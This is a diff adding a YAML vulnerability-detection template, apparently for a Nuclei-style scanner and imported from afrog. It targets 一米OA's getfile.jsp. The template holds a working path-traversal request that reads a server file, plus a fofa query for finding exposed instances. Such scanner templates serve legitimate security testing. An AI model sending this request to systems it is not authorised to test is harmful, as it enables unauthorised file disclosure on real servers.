@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"com.redmoon.oa.pvg.Privilege"'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp'
+id: yimi-oa-getfile-fileread
+info:
+  author: zan8in
+  description: |
+    一米OA getfile.jsp文件过滤不足，导致任意文件读取漏洞
+    fofa: app="一米OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 一米OA getfile.jsp 任意文件读取漏洞
+  severity: high
+  tags: yimi,oa,getfile,fileread,argus-import
